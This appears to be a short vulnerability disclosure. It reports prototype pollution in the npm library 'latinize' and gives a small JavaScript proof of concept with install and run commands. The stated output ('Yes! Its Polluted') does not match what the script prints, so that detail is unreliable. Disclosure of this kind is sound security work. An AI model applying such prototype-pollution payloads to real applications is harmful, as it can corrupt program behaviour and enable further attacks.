# Description

`latinize` is a popular library with 12,575 Weekly downloads.It is used to convert accents from strings to latin characters.It is also vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
var latinize = require('latinize');
const obj = {}
console.log('Before: ' + {}.polluted)
latinize(obj['__proto__'], {}).polluted = 'Polluted!'
console.log('After: ' + {}.polluted)
```

2. Execute the following commands in terminal:

```
npm i latinize # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Yes! Its Polluted
```
